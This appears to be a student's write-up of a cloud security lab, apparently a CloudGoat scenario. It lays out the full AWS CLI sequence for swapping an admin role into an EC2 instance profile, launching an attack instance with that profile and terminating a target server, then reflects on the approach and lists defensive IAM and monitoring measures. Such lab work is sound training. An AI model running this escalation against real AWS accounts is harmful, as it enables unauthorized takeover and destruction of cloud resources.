
Solution:
To terminate the target EC2 instance and complete the challenge, I've taken the following steps:

a. Configured AWS CLI with Kerrigan's credentials and verified identity:
aws configure --profile kerrigan
aws sts get-caller-identity --profile kerrigan
Output confirmed we were logged in as cg-kerrigan-iam_privesc_by_attachment-abc123xyz with limited permissions.

b. Reviewed the terraform outputs to understand the environment:
terraform output -json
This revealed two IAM roles (meek and mighty), the instance profile name, target instance ID, subnet ID, and security group ID. The meek role had limited permissions while the mighty role had AdministratorAccess. The target instance had the meek instance profile attached.

c. Removed the meek role from the instance profile:
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --role-name cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz \
  --profile kerrigan
No output returned which confirmed success.

d. Added the mighty (admin) role to the same instance profile:
aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --role-name cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz \
  --profile kerrigan
The instance profile now had AdministratorAccess attached to it.

e. Created an SSH key pair to access the attack instance:
aws ec2 create-key-pair \
  --key-name attack-key \
  --profile kerrigan \
  --query 'KeyMaterial' \
  --output text > attack-key.pem
chmod 400 attack-key.pem

f. Found the latest Amazon Linux 2 AMI available in the region:
aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
  "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
  --output text \
  --profile kerrigan
Result: ami-0d05471b100e9083f

g. Launched an attack EC2 instance using the modified instance profile which now had admin privileges:
aws ec2 run-instances \
  --image-id ami-0d05471b100e9083f \
  --instance-type t3.micro \
  --key-name attack-key \
  --subnet-id subnet-00765ff282f87f7f4 \
  --security-group-ids sg-0aae65ae6605774a9 \
  --iam-instance-profile Name=cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=attack-instance}]' \
  --associate-public-ip-address \
  --profile kerrigan \
  --query 'Instances[0].InstanceId' \
  --output text
Result: i-06efd49a43dbcbe00

h. Waited for the instance to boot and retrieved its public IP:
aws ec2 wait instance-running --instance-ids i-06efd49a43dbcbe00 --profile kerrigan
aws ec2 describe-instances \
  --instance-ids i-06efd49a43dbcbe00 \
  --profile kerrigan \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text
Result: 44.197.179.246

i. SSH'd into the attack instance and terminated the target server using the admin permissions from the mighty role:
ssh -i attack-key.pem ec2-user@44.197.179.246
aws ec2 terminate-instances --instance-ids i-0405442ca5eb9c8fd --region us-east-1
Result: Target instance state changed from "running" to "shutting-down" confirming successful termination.

Reflection:
What was your approach?
My starting point was understanding what Kerrigan could actually do. After reviewing the terraform outputs I could see there were two roles — one weak and one with full admin access — and that Kerrigan had permissions to modify instance profile attachments. That was the key insight. Instead of trying to directly attack the target, I realized I could swap the role inside the instance profile and then launch my own EC2 that would inherit those admin permissions automatically.

What was the biggest challenge?
The trickiest part was realizing that the mighty role alone wasn't enough. You can't just assign a role directly to yourself as an IAM user — it had to be attached to an instance profile first, and then used by an EC2 instance. Understanding that gap between having a role exist and actually being able to use it took a bit of thinking.

How did you overcome the challenges?
Once I mapped out the full attack path it became clear that role swapping was the only viable route. By removing the meek role and inserting the mighty role into the existing instance profile, I could launch a fresh EC2 that would boot up with admin-level permissions baked in. From inside that instance, the AWS CLI automatically used the attached role so no credentials were needed at all.

What led to the breakthrough?
The breakthrough came when I confirmed that Kerrigan had both iam:RemoveRoleFromInstanceProfile and iam:AddRoleToInstanceProfile permissions. That combination is all you need to completely swap out the privilege level of any instance profile. Once the role swap was done and the attack instance was running, terminating the target was just one command.

On the blue side, how can this learning be used to properly defend important assets?
This attack worked entirely because Kerrigan had too much IAM flexibility. To properly defend against this kind of escalation:
a. Restrict iam:AddRoleToInstanceProfile and iam:RemoveRoleFromInstanceProfile — these permissions should almost never be given to regular users
b. Use iam:PassRole conditions to limit which roles can be attached to which resources
c. Monitor CloudTrail closely for any ModifyInstanceProfile or AddRoleToInstanceProfile events as these are strong indicators of a privilege escalation attempt
d. Apply strict least privilege across all IAM users — Kerrigan should only have had access to what the job strictly required
e. Use AWS Config rules to alert when high-privilege roles get attached to instance profiles unexpectedly
